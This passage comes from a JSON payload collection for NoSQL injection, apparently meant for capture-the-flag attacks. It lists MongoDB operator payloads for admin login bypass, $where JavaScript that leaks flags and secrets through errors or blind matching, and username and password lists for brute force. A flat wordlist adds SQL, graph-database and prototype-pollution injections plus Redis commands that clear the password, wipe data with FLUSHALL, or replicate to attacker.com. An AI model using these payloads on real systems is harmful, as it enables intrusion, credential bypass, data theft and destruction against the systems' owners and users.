        "flag": {
          "$gt": ""
        }
      },
      {
        "secret": {
          "$exists": true
        }
      },
      {
        "key": {
          "$exists": true
        }
      },
      {
        "answer": {
          "$exists": true
        }
      }
    ],
    "flag_regex_probes": [
      {
        "flag": {
          "$regex": "^CTF\\{"
        }
      },
      {
        "flag": {
          "$regex": "^FLAG\\{"
        }
      },
      {
        "flag": {
          "$regex": "^flag\\{"
        }
      },
      {
        "flag": {
          "$regex": "^[A-Z]{2,5}\\{"
        }
      },
      {
        "flag": {
          "$regex": "^picoCTF\\{"
        }
      },
      {
        "flag": {
          "$regex": "^HackTheBox\\{"
        }
      },
      {
        "flag": {
          "$regex": "^HTB\\{"
        }
      },
      {
        "flag": {
          "$regex": "^THM\\{"
        }
      },
      {
        "flag": {
          "$regex": "^DUCTF\\{"
        }
      },
      {
        "flag": {
          "$regex": "^CSAW\\{"
        }
      },
      {
        "flag": {
          "$regex": "^zer0pts\\{"
        }
      },
      {
        "flag": {
          "$regex": "^corctf\\{"
        }
      },
      {
        "flag": {
          "$regex": "^bcactf\\{"
        }
      },
      {
        "flag": {
          "$regex": "^ACSC\\{"
        }
      },
      {
        "flag": {
          "$regex": "^bi0s\\{"
        }
      },
      {
        "flag": {
          "$regex": "^[a-zA-Z0-9_]+\\{[a-zA-Z0-9_!@#$%^&*]+\\}"
        }
      },
      {
        "secret": {
          "$regex": "^CTF\\{"
        }
      },
      {
        "secret": {
          "$regex": "^FLAG\\{"
        }
      },
      {
        "key": {
          "$regex": "^CTF\\{"
        }
      },
      {
        "username": {
          "$eq": "admin"
        },
        "flag": {
          "$regex": "^CTF\\{[a-zA-Z0-9_]"
        }
      },
      {
        "username": {
          "$eq": "admin"
        },
        "flag": {
          "$regex": "^CTF\\{[a-zA-Z0-9_]+\\}$"
        }
      }
    ],
    "admin_bypass": [
      {
        "username": {
          "$in": [
            "admin",
            "ctfadmin",
            "root",
            "superuser",
            "ctf"
          ]
        },
        "password": {
          "$gt": ""
        }
      },
      {
        "username": {
          "$regex": "^admin"
        },
        "password": {
          "$ne": "wrong"
        }
      },
      {
        "username": "admin",
        "password": {
          "$ne": "notthepassword"
        }
      },
      {
        "username": "admin",
        "password": {
          "$regex": ".*"
        }
      },
      {
        "username": {
          "$ne": ""
        },
        "role": {
          "$eq": "admin"
        }
      },
      {
        "$or": [
          {
            "username": "admin"
          },
          {
            "role": "admin"
          }
        ],
        "password": {
          "$gt": ""
        }
      },
      {
        "username": {
          "$ne": null
        },
        "password": {
          "$ne": null
        },
        "role": "admin"
      },
      {
        "isAdmin": true,
        "password": {
          "$ne": null
        }
      },
      {
        "username": {
          "$regex": "admin",
          "$options": "i"
        },
        "password": {
          "$ne": null
        }
      },
      {
        "$where": "this.role == 'admin'",
        "password": {
          "$ne": null
        }
      }
    ],
    "error_based_flag_dump": [
      {
        "$where": "if(typeof this.flag !== 'undefined') throw new Error(this.flag)"
      },
      {
        "$where": "if(typeof this.FLAG !== 'undefined') throw new Error(this.FLAG)"
      },
      {
        "$where": "if(typeof this.secret !== 'undefined') throw new Error(this.secret)"
      },
      {
        "$where": "if(typeof this.token !== 'undefined') throw new Error(this.token)"
      },
      {
        "$where": "throw new Error(JSON.stringify(this))"
      },
      {
        "$where": "if(this.role=='admin') throw new Error(JSON.stringify(this))"
      },
      {
        "$where": "if(typeof this.flag !== 'undefined') throw new Error(JSON.stringify(this))"
      },
      {
        "$where": "if(this.flag) throw new Error(this.flag)"
      },
      {
        "$where": "if(this.secret) throw new Error(this.secret)"
      }
    ],
    "blind_flag_extraction": [
      {
        "$where": "this.flag && this.flag.match(/^CTF\\{a/)"
      },
      {
        "$where": "this.flag && this.flag.match(/^CTF\\{b/)"
      },
      {
        "$where": "this.flag && this.flag.match(/^CTF\\{c/)"
      },
      {
        "$where": "this.flag && this.flag.length > 10"
      },
      {
        "$where": "this.flag && this.flag.length > 20"
      },
      {
        "$where": "this.flag && this.flag.length > 30"
      },
      {
        "$where": "this.flag && this.flag.length > 40"
      },
      {
        "$where": "this.flag && this.flag.length > 50"
      },
      {
        "username": {
          "$eq": "admin"
        },
        "flag": {
          "$regex": "^CTF\\{a"
        }
      },
      {
        "username": {
          "$eq": "admin"
        },
        "flag": {
          "$regex": "^CTF\\{[a-z]"
        }
      },
      {
        "username": {
          "$eq": "admin"
        },
        "flag": {
          "$regex": "^CTF\\{[0-9]"
        }
      },
      {
        "username": {
          "$eq": "admin"
        },
        "flag": {
          "$regex": "^CTF\\{[a-zA-Z0-9_]{0,5}"
        }
      },
      {
        "username": {
          "$eq": "admin"
        },
        "flag": {
          "$regex": "^CTF\\{[a-zA-Z0-9_]{10,}\\}"
        }
      }
    ]
  },
  "common_usernames": {
    "description": "Common admin/test usernames for enumeration",
    "values": [
      "admin",
      "administrator",
      "root",
      "superadmin",
      "super",
      "user",
      "test",
      "guest",
      "operator",
      "manager",
      "support",
      "service",
      "system",
      "info",
      "webmaster",
      "postmaster",
      "hostmaster",
      "secure",
      "security",
      "master",
      "owner",
      "staff",
      "sa",
      "dba",
      "oracle",
      "postgres",
      "mysql",
      "mongo",
      "api",
      "dev",
      "developer",
      "staging",
      "prod",
      "production",
      "ops",
      "ctf",
      "flag",
      "challenge",
      "player",
      "hacker",
      "ctfadmin",
      "demo",
      "anonymous",
      "nobody",
      "www",
      "www-data",
      "nginx",
      "apache",
      "redis",
      "elastic",
      "kibana",
      "grafana",
      "jenkins",
      "gitlab",
      "github",
      "deploy",
      "devops",
      "ci",
      "cd",
      "bot",
      "robot",
      "automation",
      "superuser",
      "sysadmin",
      "netadmin",
      "dbadmin",
      "webadmin",
      "backup",
      "restore",
      "monitor",
      "nagios",
      "zabbix",
      "splunk",
      "admin1",
      "admin2",
      "admintest",
      "testadmin",
      "supertest",
      "god",
      "overlord",
      "privileged",
      "elite",
      "moderator",
      "mod",
      "helpdesk",
      "tech",
      "intern",
      "contractor",
      "employee",
      "account",
      "accounts",
      "billing",
      "finance",
      "hr",
      "legal",
      "cto",
      "ceo",
      "ciso",
      "vp",
      "president",
      "director",
      "4dm1n",
      "adm1n",
      "4dmin",
      "adm!n",
      "adm",
      "a",
      "admin@localhost"
    ]
  },
  "common_passwords": {
    "description": "Common passwords to use in brute-force with $regex or $in",
    "values": [
      "password",
      "123456",
      "password123",
      "admin",
      "admin123",
      "root",
      "pass",
      "test",
      "1234",
      "12345",
      "letmein",
      "welcome",
      "monkey",
      "dragon",
      "master",
      "superman",
      "batman",
      "qwerty",
      "abc123",
      "iloveyou",
      "sunshine",
      "princess",
      "football",
      "shadow",
      "toor",
      "pass123",
      "secret",
      "changeme",
      "default",
      "temp",
      "P@ssw0rd",
      "P@ssword1",
      "Admin@123",
      "Root@123",
      "password1",
      "12345678",
      "123456789",
      "1234567890",
      "00000000",
      "11111111",
      "0987654321",
      "!@#$%^&*",
      "Password1!",
      "Qwerty123!",
      "Summer2024",
      "Winter2024",
      "Spring2024",
      "Fall2024",
      "Summer2025",
      "Company123!",
      "Welcome1!",
      "Temp1234!",
      "Passw0rd!",
      "mongo",
      "mongodb",
      "mongoose",
      "nosql",
      "database",
      "redis",
      "elastic",
      "cassandra",
      "couchdb",
      "dynamodb",
      "admin@123",
      "root@123",
      "test@123",
      "user@123",
      "123qwe",
      "qwe123",
      "pass@123",
      "login123",
      "trustno1",
      "baseball",
      "hockey",
      "jordan",
      "harley",
      "ranger",
      "dakota",
      "hunter",
      "george",
      "thomas",
      "tigger",
      "robert",
      "soccer",
      "batman",
      "michael",
      "master",
      "superman",
      "letmein",
      "access",
      "hello",
      "aaaaaa",
      "123abc",
      "000000",
      "zxcvbn",
      "qwerty1"
    ]
  },
  "complete_flat_wordlist": {
    "description": "Complete flat wordlist of all injection strings for automated testing",
    "payloads": [
      "true, $where: '1 == 1'",
      ", $where: '1 == 1'",
      "$where: '1 == 1'",
      "', $where: '1 == 1",
      "1, $where: '1 == 1'",
      "{ $ne: 1 }",
      "', $or: [ {}, { 'a':'a",
      "' } ], $comment:'successful MongoDB injection'",
      "db.injection.insert({success:1});",
      "db.injection.insert({success:1});return 1;db.stores.mapReduce(function() { { emit(1,1",
      "|| 1==1",
      "|| 1==1//",
      "|| 1==1%00",
      "}, { password : /.*/}",
      "' && this.password.match(/.*/)//+%00",
      "' && this.passwordzz.match(/.*/)//+%00",
      "'%20%26%26%20this.password.match(/.*/)//+%00",
      "'%20%26%26%20this.passwordzz.match(/.*/)//+%00",
      "{$gt: ''}",
      "[$ne]=1",
      "';sleep(5000);",
      "';it=new%20Date();do{pt=new%20Date();}while(pt-it<5000);",
      "{\"username\": {\"$ne\": null}, \"password\": {\"$ne\": null}}",
      "{\"username\": {\"$ne\": \"foo\"}, \"password\": {\"$ne\": \"bar\"}}",
      "{\"username\": {\"$gt\": undefined}, \"password\": {\"$gt\": undefined}}",
      "{\"username\": {\"$gt\":\"\"}, \"password\": {\"$gt\":\"\"}}",
      "{\"username\":{\"$in\":[\"Admin\", \"4dm1n\", \"admin\", \"root\", \"administrator\"]},\"password\":{\"$gt\":\"\"}}",
      "' || '1'=='1",
      "' || 1==1//",
      "' || 1==1%00",
      "admin' || 'a'=='a",
      "' || true//",
      "' || true%00",
      "'; return true; var x='",
      "x'; return true; //",
      "username[$ne]=toto&password[$ne]=toto",
      "username[$regex]=.*&password[$regex]=.*",
      "username[$exists]=true&password[$exists]=true",
      "username[$ne]=1&password[$ne]=1",
      "username[$gt]=&password[$gt]=",
      "username[$gte]=&password[$gte]=",
      "username[$lt]=z&password[$lt]=z",
      "username[$in][0]=admin&password[$gt]=",
      "username[$nin][0]=notexist&password[$gt]=",
      "' && this.password%00",
      "' && this.password && this.password.match(/^a.*$/)%00",
      "admin'//",
      "admin'/*",
      "admin'%00",
      "admin'--",
      "' || '' == '",
      "admin'||'1'=='1",
      "{\"$where\": \"sleep(5000)||true\"}",
      "{\"$where\": \"1==1\"}",
      "{\"$where\": \"this.username != null\"}",
      "{\"$where\": \"throw new Error(JSON.stringify(this))\"}",
      "data[$where]=1==1",
      "filter[$ne]=x",
      "query[$gt]=",
      "__proto__[admin]=true",
      "__proto__[role]=admin",
      "__proto__[isAdmin]=true",
      "constructor[prototype][admin]=true",
      "__proto__[$ne]=",
      "__proto__[$gt]=",
      "update[$set][role]=admin",
      "update[$set][isAdmin]=true",
      "update[$unset][twoFactorSecret]=1",
      "_id[$ne]=000000000000000000000000",
      "_id[$exists]=true",
      "_id[$gt]=000000000000000000000000",
      "id[$ne]=0",
      "id[$gt]=0",
      "{\"$where\": \"typeof this.flag !== 'undefined'\"}",
      "{\"$where\": \"if(typeof this.flag !== 'undefined') throw new Error(this.flag)\"}",
      "{\"flag\": {\"$exists\": true}}",
      "{\"flag\": {\"$regex\": \"^CTF\\\\{\"}}",
      "{\"flag\": {\"$ne\": null}}",
      "{\"isAdmin\": true, \"password\": {\"$ne\": null}}",
      "{\"$or\": [{\"role\": \"admin\"}, {\"isAdmin\": true}], \"password\": {\"$gt\": \"\"}}",
      "username=admin&password=true",
      "username=admin&password[]=",
      "username[]=admin&password[]=password",
      "{\"username\": \"admin\", \"password\": true}",
      "{\"username\": \"admin\", \"password\": []}",
      "{\"username\": \"admin\", \"password\": null}",
      "q=*:*",
      "q=role:admin",
      "q=username:admin",
      "{\"selector\": {}}",
      "{\"selector\": {\"_id\": {\"$gt\": null}}}",
      "/_all_dbs",
      "/_utils/",
      "KEYS *",
      "GET flag",
      "EVAL \"return redis.call('keys','*')\" 0",
      "' OR '1'='1",
      "' OR 1=1--",
      "admin' ALLOW FILTERING--",
      "'; SELECT * FROM users; --",
      "FilterExpression=:u = :u",
      "' OR '1'=='1",
      "' || NaN!=NaN || '",
      "' || Math.random()>=0 || '",
      "' || isNaN(NaN) || '",
      "' || typeof ''!='number' || '",
      "' || parseInt('1')===1 || '",
      "' || this.constructor!==undefined || '",
      "' || this.hasOwnProperty('_id') || '",
      "' || Object.keys(this).indexOf('_id')>=0 || '",
      "'; FOR u IN users RETURN u;//",
      "'; MATCH (n) RETURN n;--",
      "' RETURN true--",
      "' OR username IS NOT MISSING--",
      "' UNION SELECT * FROM `users`--",
      "admin') OR ('1'='1",
      "' OR exists(u.password)--",
      "/.json",
      "/users.json",
      "/admin.json",
      "/users.json?shallow=true",
      "username[$not][$eq]=x&password[$gt]=",
      "username[$nor][0][$eq]=notexist&password[$gt]=",
      "username[$all][0]=admin&password[$gt]=",
      "username[$elemMatch][$gt]=&password[$gt]=",
      "username[$type]=2&password[$gt]=",
      "username[$mod][0]=1&username[$mod][1]=0&password[$gt]=",
      "{\"$where\": \"Object.keys(this).join(',').includes('flag')\"}",
      "{\"$where\": \"JSON.stringify(this).includes('flag')\"}",
      "{\"$where\": \"this.flag && this.flag.startsWith('CTF{\"}",
      "{\"$where\": \"if(this.flag && this.flag.startsWith('CTF{')) throw new Error(this.flag)\"}",
      "prototype[admin]=true",
      "prototype[isAdmin]=true",
      "O:8:\"stdClass\":2:{s:8:\"username\";O:8:\"stdClass\":1:{s:3:\"$ne\";N;}s:8:\"password\";O:8:\"stdClass\":1:{s:3:\"$ne\";N;}}",
      "{\"__proto__\": {\"admin\": true}}",
      "{\"__proto__\": {\"role\": \"admin\"}}",
      "{\"constructor\": {\"prototype\": {\"admin\": true}}}",
      "' OR LENGTH(u.password) > 0",
      "' OR u.isAdmin == true",
      "'; RETURN COLLECTIONS();//",
      "' OR role = 'admin'--",
      "'; SELECT * FROM OUser;--",
      "\r\nKEYS *\r\n",
      "\r\nGET flag\r\n",
      "PING\r\nKEYS *\r\n",
      "CONFIG GET *",
      "CONFIG SET requirepass \"\"",
      "SLAVEOF attacker.com 6379",
      "FLUSHALL",
      "SCAN 0 MATCH *"
    ]
  }
}